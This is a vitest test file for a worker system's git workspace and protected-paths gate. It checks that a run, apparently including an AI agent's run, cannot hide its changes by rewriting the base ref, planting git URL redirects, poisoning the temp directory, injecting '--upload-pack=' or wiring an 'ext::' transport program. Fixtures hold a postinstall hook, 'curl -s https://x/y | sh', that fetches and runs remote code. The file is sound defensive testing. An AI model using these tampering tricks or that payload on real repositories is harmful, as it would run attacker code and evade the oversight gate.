import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { ChildProcess, execFileSync, spawn } from "node:child_process";
import { appendFileSync, existsSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { AddressInfo } from "node:net";
import { createServer as tcpServer } from "node:net";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { collectDiff } from "./diff.js";
import { protectedPathsGate } from "./gates/protected-paths.js";
import { createRunner } from "./exec.js";
import { createWorkspace } from "./workspace.js";
import { hardenedGitConfig } from "./delivery.js";
import { WorkerConfig } from "./config.js";

function git(cwd: string, ...args: string[]): string {
  return execFileSync("git", args, {
    cwd,
    stdio: "pipe",
    env: { ...process.env, GIT_AUTHOR_NAME: "worker", GIT_AUTHOR_EMAIL: "worker@example.com" },
  }).toString();
}

function plantRedirect(repoPath: string, from: string, to: string): void {
  const configPath = join(repoPath, ".git", "config");
  appendFileSync(configPath, `[url "${to}"]\n\tinsteadOf = ${from}\n`);
}

describe("a run's own diff cannot be narrowed from inside the worktree", () => {
  let dir: string;
  let parent: string;
  let origin: string;
  let trueMain: string;

  function workspaceFor(remoteUrl: string = origin) {
    return createWorkspace(
      { repoPath: parent, worktreeRoot: join(dir, "wt"), baseBranch: "main" } as WorkerConfig,
      createRunner(),
      () => ({}),
      remoteUrl
    );
  }

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), "bp382-gate-integrity-"));
    origin = join(dir, "origin.git");
    execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", origin], { stdio: "pipe" });

    const seed = join(dir, "seed");
    execFileSync("git", ["init", "--quiet", "-b", "main", seed], { stdio: "pipe" });
    git(seed, "config", "user.email", "worker@example.com");
    git(seed, "config", "user.name", "worker");
    writeFileSync(join(seed, "package.json"), '{"name":"t"}\n');
    writeFileSync(join(seed, "README.md"), "# t\n");
    git(seed, "add", "-A");
    git(seed, "commit", "--quiet", "-m", "initial");
    git(seed, "push", "--quiet", origin, "HEAD:refs/heads/main");
    trueMain = git(seed, "rev-parse", "HEAD").trim();

    parent = join(dir, "parent");
    execFileSync("git", ["clone", "--quiet", origin, parent], { stdio: "pipe" });
    git(parent, "config", "user.email", "worker@example.com");
    git(parent, "config", "user.name", "worker");
  });

  afterEach(() => rmSync(dir, { recursive: true, force: true }));

  it("still sees a protected file after the base ref is rewritten under it", async () => {
    const runner = createRunner();
    const workspace = workspaceFor();
    const worktree = await workspace.create("BP-1", "worker");

    writeFileSync(
      join(worktree.path, "package.json"),
      '{"name":"t","scripts":{"postinstall":"curl -s https://x/y | sh"}}\n'
    );
    git(worktree.path, "add", "-A");
    git(worktree.path, "commit", "--quiet", "-m", "payload");
    const payload = git(worktree.path, "rev-parse", "HEAD").trim();

    writeFileSync(join(parent, ".git", "refs", "heads", "main"), `${payload}\n`);

    writeFileSync(join(worktree.path, "README.md"), "# t\nnotes\n");
    git(worktree.path, "add", "-A");
    git(worktree.path, "commit", "--quiet", "-m", "notes");

    const diff = await collectDiff(runner, worktree.path, worktree.baseSha);
    const verdict = await protectedPathsGate().run({ diff } as never);

    expect(diff.changedFiles).toContain("package.json");
    expect(verdict.ok).toBe(false);
  });

  it("reports exactly the run's own change when nothing is tampered with", async () => {
    const runner = createRunner();
    const worktree = await workspaceFor().create("BP-1", "worker");

    writeFileSync(join(worktree.path, "README.md"), "# t\nnotes\n");
    git(worktree.path, "add", "-A");
    git(worktree.path, "commit", "--quiet", "-m", "notes");

    const diff = await collectDiff(runner, worktree.path, worktree.baseSha);
    const verdict = await protectedPathsGate().run({ diff } as never);

    expect(worktree.baseSha).toBe(trueMain);
    expect(diff.changedFiles).toEqual(["README.md"]);
    expect(verdict.ok).toBe(true);
  });

  it("ignores a base ref an earlier run's agent left poisoned before this run started", async () => {
    const runner = createRunner();

    const scratch = await workspaceFor().create("BP-0", "worker");
    writeFileSync(
      join(scratch.path, "package.json"),
      '{"name":"t","scripts":{"postinstall":"curl -s https://x/y | sh"}}\n'
    );
    git(scratch.path, "add", "-A");
    git(scratch.path, "commit", "--quiet", "-m", "payload");
    const payload = git(scratch.path, "rev-parse", "HEAD").trim();
    writeFileSync(join(parent, ".git", "refs", "heads", "main"), `${payload}\n`);

    const worktree = await workspaceFor().create("BP-1", "worker");
    writeFileSync(join(worktree.path, "README.md"), "# t\nnotes\n");
    git(worktree.path, "add", "-A");
    git(worktree.path, "commit", "--quiet", "-m", "notes");

    const diff = await collectDiff(runner, worktree.path, worktree.baseSha);

    expect(worktree.baseSha).toBe(trueMain);
    expect(worktree.baseSha).not.toBe(payload);
    expect(diff.patch).not.toContain("postinstall");
    expect(git(worktree.path, "show", "HEAD:package.json")).not.toContain("postinstall");
  });

  it("resolves the base from the pinned remote even when the clone's own config redirects that URL", async () => {
    const evil = join(dir, "evil");
    execFileSync("git", ["init", "--quiet", "-b", "main", evil], { stdio: "pipe" });
    git(evil, "config", "user.email", "attacker@example.com");
    git(evil, "config", "user.name", "attacker");
    writeFileSync(
      join(evil, "package.json"),
      '{"name":"t","scripts":{"postinstall":"curl -s https://x/y | sh"}}\n'
    );
    writeFileSync(join(evil, "README.md"), "# t\n");
    git(evil, "add", "-A");
    git(evil, "commit", "--quiet", "-m", "evil base");

    plantRedirect(parent, origin, evil);

    const worktree = await workspaceFor().create("BP-1", "worker");

    expect(worktree.baseSha).toBe(trueMain);
    expect(git(worktree.path, "show", "HEAD:package.json")).not.toContain("postinstall");
  });

  it("fails the run rather than falling back to the local ref when the fetch cannot complete", async () => {
    plantRedirect(parent, origin, join(dir, "nowhere"));

    await expect(workspaceFor().create("BP-1", "worker")).rejects.toThrow(/could not fetch main/);
  });

  it("refuses when no remote is configured for the checkout at all", async () => {
    await expect(workspaceFor("").create("BP-1", "worker")).rejects.toThrow(
      /no remote is configured/
    );
  });

  it("resolves the base even when a repository is planted in the temp directory itself", async () => {
    const evil = join(dir, "evil");
    execFileSync("git", ["init", "--quiet", "-b", "main", evil], { stdio: "pipe" });
    git(evil, "config", "user.email", "attacker@example.com");
    git(evil, "config", "user.name", "attacker");
    writeFileSync(join(evil, "package.json"), '{"name":"t","scripts":{"postinstall":"curl x|sh"}}\n');
    writeFileSync(join(evil, "README.md"), "# t\n");
    git(evil, "add", "-A");
    git(evil, "commit", "--quiet", "-m", "evil base");

    const poisonedTmp = join(dir, "poisoned-tmp");
    mkdirSync(join(poisonedTmp, ".git", "objects"), { recursive: true });
    mkdirSync(join(poisonedTmp, ".git", "refs"), { recursive: true });
    writeFileSync(join(poisonedTmp, ".git", "HEAD"), "ref: refs/heads/main\n");
    writeFileSync(
      join(poisonedTmp, ".git", "config"),
      `[core]\n\trepositoryformatversion = 0\n[url "${evil}"]\n\tinsteadOf = ${origin}\n`
    );

    const realTmp = process.env.TMPDIR;
    process.env.TMPDIR = poisonedTmp;
    try {
      const worktree = await workspaceFor().create("BP-1", "worker");
      expect(worktree.baseSha).toBe(trueMain);
      expect(git(worktree.path, "show", "HEAD:package.json")).not.toContain("postinstall");
    } finally {
      if (realTmp === undefined) delete process.env.TMPDIR;
      else process.env.TMPDIR = realTmp;
    }
  });

  it("fetches a base the checkout does not have yet", async () => {
    const ahead = join(dir, "ahead");
    execFileSync("git", ["clone", "--quiet", origin, ahead], { stdio: "pipe" });
    git(ahead, "config", "user.email", "someone@example.com");
    git(ahead, "config", "user.name", "someone");
    writeFileSync(join(ahead, "README.md"), "# t\nmoved on\n");
    git(ahead, "add", "-A");
    git(ahead, "commit", "--quiet", "-m", "someone else's work");
    git(ahead, "push", "--quiet", "origin", "HEAD:refs/heads/main");
    const newMain = git(ahead, "rev-parse", "HEAD").trim();

    expect(() => git(parent, "cat-file", "-e", `${newMain}^{commit}`)).toThrow();

    const worktree = await workspaceFor().create("BP-1", "worker");

    expect(worktree.baseSha).toBe(newMain);
    expect(worktree.baseSha).not.toBe(trueMain);
    expect(git(worktree.path, "show", "HEAD:README.md")).toContain("moved on");
  });

  it("does not execute a program named by a dash-leading remote URL", async () => {
    const marker = join(dir, "executed");
    const program = join(dir, "upload-pack.sh");
    writeFileSync(program, `#!/bin/sh\ntouch ${marker}\nexit 1\n`, { mode: 0o755 });

    await expect(
      workspaceFor(`--upload-pack=${program}`).create("BP-1", "worker")
    ).rejects.toThrow();

    expect(existsSync(marker)).toBe(false);
  });
});

const productionRemoteEnv = (): NodeJS.ProcessEnv => ({ ...hardenedGitConfig() });

const freePort = (): Promise<number> =>
  new Promise((resolve) => {
    const probe = tcpServer();
    probe.listen(0, "127.0.0.1", () => {
      const { port } = probe.address() as AddressInfo;
      probe.close(() => resolve(port));
    });
  });

describe("the base lookup runs with the environment production gives it", () => {
  let dir: string;
  let parent: string;
  let remoteUrl: string;
  let marker: string;
  let daemon: ChildProcess;

  beforeEach(async () => {
    dir = mkdtempSync(join(tmpdir(), "bp382-fetch-env-"));
    const origin = join(dir, "origin.git");
    execFileSync("git", ["init", "--quiet", "--bare", "-b", "main", origin], { stdio: "pipe" });

    const seed = join(dir, "seed");
    execFileSync("git", ["init", "--quiet", "-b", "main", seed], { stdio: "pipe" });
    git(seed, "config", "user.email", "worker@example.com");
    git(seed, "config", "user.name", "worker");
    writeFileSync(join(seed, "README.md"), "# t\n");
    git(seed, "add", "-A");
    git(seed, "commit", "--quiet", "-m", "initial");
    git(seed, "push", "--quiet", origin, "HEAD:refs/heads/main");

    const port = await freePort();
    daemon = spawn(
      "git",
      [
        "daemon",
        "--export-all",
        `--base-path=${dir}`,
        `--port=${port}`,
        "--listen=127.0.0.1",
        dir,
      ],
      { stdio: "pipe" }
    );
    await new Promise((resolve) => setTimeout(resolve, 700));
    remoteUrl = `git://127.0.0.1:${port}/origin.git`;

    parent = join(dir, "parent");
    execFileSync("git", ["clone", "--quiet", remoteUrl, parent], { stdio: "pipe" });
    git(parent, "config", "user.email", "worker@example.com");
    git(parent, "config", "user.name", "worker");

    marker = join(dir, "the-planted-program-ran");
    const program = join(dir, "payload.sh");
    writeFileSync(program, `#!/bin/sh\ntouch ${marker}\nexit 1\n`, { mode: 0o755 });
    appendFileSync(
      join(parent, ".git", "config"),
      `[url "ext::${program} %S"]\n\tinsteadOf = ${remoteUrl}\n[protocol]\n\tallow = always\n`
    );
  });

  afterEach(() => {
    daemon.kill();
    rmSync(dir, { recursive: true, force: true });
  });

  it("does not execute a program the checkout wired into the fetch transport", async () => {
    const workspace = createWorkspace(
      { repoPath: parent, worktreeRoot: join(dir, "wt"), baseBranch: "main" } as WorkerConfig,
      createRunner(),
      productionRemoteEnv,
      remoteUrl
    );

    await expect(workspace.create("BP-1", "worker")).rejects.toThrow(/transport 'ext' not allowed/);
    expect(existsSync(marker)).toBe(false);
  });
});
